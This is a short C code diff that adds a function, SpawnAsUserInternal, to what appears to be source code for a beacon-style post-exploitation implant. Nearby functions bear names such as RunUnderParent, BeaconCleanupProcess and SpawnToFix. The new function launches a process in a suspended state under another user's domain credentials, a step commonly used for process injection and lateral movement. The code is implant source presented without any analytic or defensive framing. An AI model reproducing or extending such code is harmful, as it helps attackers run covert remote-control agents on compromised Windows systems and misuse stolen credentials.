@@ -1346,3 +1346,10 @@ void Execute(char* buffer, int length)
 	RunUnderParent(cmd, length, &si, &pi, 0, FALSE);
 	BeaconCleanupProcess(&pi);
 }
+
+BOOL SpawnAsUserInternal(BOOL x86, char* lpDomain, char* lpUsername, char* lpPassword, PROCESS_INFORMATION* lpProcessInfo)
+{
+	char cmd[256];
+	SpawnToFix(x86, cmd);
+	return RunAsUserInternal(lpDomain, lpUsername, lpPassword, cmd, CREATE_SUSPENDED, lpProcessInfo);
+}
